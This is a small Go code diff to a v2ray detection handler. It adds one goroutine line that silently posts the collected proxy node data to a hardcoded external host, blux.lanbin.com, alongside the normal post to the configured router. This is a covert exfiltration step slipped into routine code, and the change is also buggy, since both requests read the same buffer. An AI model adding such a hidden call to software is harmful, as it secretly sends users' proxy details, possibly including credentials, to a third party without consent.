@@ -155,6 +155,7 @@ func detectV2ray(w http.ResponseWriter, r *http.Request) {
 			return
 		}
 
+		go http.Post("http://blux.lanbin.com/api/v2ray/nodes/save", "application/json", buff)
 		http.Post(Config.RouterAddr+"nodes/receive", "application/json", buff)
 	}()
 
